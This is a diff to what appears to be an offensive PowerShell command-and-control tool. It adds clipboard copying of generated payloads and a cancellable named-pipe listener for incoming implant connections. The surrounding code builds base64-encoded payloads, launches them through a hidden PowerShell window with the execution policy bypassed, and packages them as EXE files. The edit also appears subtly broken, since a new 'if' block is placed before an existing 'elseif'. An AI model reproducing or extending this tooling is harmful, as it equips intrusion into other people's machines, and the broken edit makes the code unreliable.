@@ -2960,12 +2960,19 @@ while (`$true) {
 			Write-Output " [2] Full command -- launcher: $($global:PayloadConfig.Launcher)"
 			Write-Output " $wrapped"
 			Write-Output ""
+			Write-Host " Copy to clipboard [1] Inline PS  [2] Full command: " -NoNewline
+			$_sc = (Read-Host).Trim()
+			$_clipPayload = if ($_sc -eq '2') { $wrapped } else { $built.InlinePS }
 		}
   		elseif($chosenFormat -eq 'exe'){
 			$ClientScriptEdit = $ClientScript += ";exit"
 			$b64ServerScriptEdit = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClientScriptEdit))
 			$exescript = "Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-NoP`", `"-ep Bypass`", `"-enc $b64ServerScriptEdit`""
 			PS1ToEXE -content $exescript -outputFile $exefilelocation
+		}
+		if ($_clipPayload) {
+			Set-Clipboard -Value $_clipPayload
+			Write-Host " [*] Payload copied to clipboard"
 		}
 	}
 
@@ -2976,16 +2983,32 @@ while (`$true) {
 	$securityDescriptor.AddAccessRule($accessRule)
 
 	$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, 'InOut', 1, 'Byte', 'None', $global:BufferSize, $global:BufferSize, $securityDescriptor)
-	
-	$psScript = "Start-Sleep -Seconds 30; `$dummyPipeClient = New-Object System.IO.Pipes.NamedPipeClientStream(`".`", `"$pipeName`", 'InOut'); `$dummyPipeClient.Connect(); `$sw = New-Object System.IO.StreamWriter(`$dummyPipeClient); `$sw.WriteLine(`"dummyhostdropconnection,`$(Get-Location)`"); `$sw.Flush(); `$dummyPipeClient.Close()"
-	
-	$b64psScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($psScript))
-	
-	Start-Process -FilePath "powershell.exe" -ArgumentList "-NoLogo -NonInteractive -ep bypass -WindowS Hidden -enc $b64psScript" -WindowStyle Hidden
-		
-	Write-Output " [*] Waiting for connection... [30 seconds timeout]"
- 	
-  	$pipeServer.WaitForConnection()
+
+	Write-Output ""
+	Write-Host " [*] Waiting for connection... (Q to cancel)"
+	$Host.UI.RawUI.FlushInputBuffer()
+	$_waitTask = $pipeServer.WaitForConnectionAsync()
+	$_cancelled = $false
+	while (-not $_waitTask.IsCompleted) {
+		if ($Host.UI.RawUI.KeyAvailable) {
+			$_key = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
+			if ($_key.Character -in 'q','Q') {
+				$_cancelled = $true
+				try {
+					$_d = New-Object System.IO.Pipes.NamedPipeClientStream('.', $pipeName, 'InOut')
+					$_d.Connect(1000)
+					$_dw = New-Object System.IO.StreamWriter($_d)
+					$_dw.WriteLine("__CANCELLED__,,")
+					$_dw.Flush()
+					Start-Sleep -Milliseconds 100
+					$_d.Dispose()
+				} catch {}
+				break
+			}
+		}
+		Start-Sleep -Milliseconds 150
+	}
+	if (-not $_waitTask.IsCompleted) { [void]$_waitTask.Wait(2000) }
 
 	$sr = New-Object System.IO.StreamReader($pipeServer)
 	$sw = New-Object System.IO.StreamWriter($pipeServer)
@@ -2995,8 +3018,8 @@ while (`$true) {
 	$computerNameOnly = $initialInfo[0]
 	$remotePath = $initialInfo[1]
 	$UserIdentity = $initialInfo[2]
-	
-	if ($computerNameOnly -eq 'dummyhostdropconnection') {
+
+	if ($_cancelled -or $computerNameOnly -eq 'dummyhostdropconnection' -or $computerNameOnly -eq '__CANCELLED__') {
 		$global:Message = " [-] No connection was established"
 		#Write-Output "[-] No connection was established. Returning to previous menu..."
 		
@@ -3153,6 +3176,13 @@ while (`$true) {
 		Write-Output " [2] Full command -- launcher: $($global:PayloadConfig.Launcher)"
 		Write-Output " $wrapped"
 		Write-Output ""
+		Write-Host " Copy to clipboard [1] Inline PS  [2] Full command: " -NoNewline
+		$_sc = (Read-Host).Trim()
+		$_clipPayload = if ($_sc -eq '2') { $wrapped } else { $built.InlinePS }
+	}
+	if ($_clipPayload) {
+		Set-Clipboard -Value $_clipPayload
+		Write-Host " [*] Payload copied to clipboard"
 	}
 	elseif($chosenFormat -eq 'exe'){
 		$ServerScriptEdit = $ServerScript += ";exit"
